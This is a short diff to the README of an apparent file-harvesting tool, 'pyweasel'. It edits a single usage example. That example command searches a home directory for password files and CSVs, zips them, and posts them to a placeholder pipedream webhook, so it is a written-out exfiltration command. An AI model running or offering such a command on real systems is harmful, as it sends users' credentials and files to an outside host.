@@ -20,7 +20,7 @@ pipenv shell
 ## Usage
 
 ```
-Example : /pyweasel.bin --url=https://your_workflow.m.pipedream.net --input-file=lin_list.txt --search_files=password.txt,csv --path=\"/home/user/\" --interactive=True --email="xxxx@gmail.com" --password="password" --zip=True')
+Example : /pyweasel.bin --url=https://your_workflow.m.pipedream.net --input-file=lin_list.txt --search_files=password.txt,csv --path="home/user/" --interactive=True --email="xxxx@gmail.com" --password="password" --zip=True'
 
 --url
         Url parameter for http server
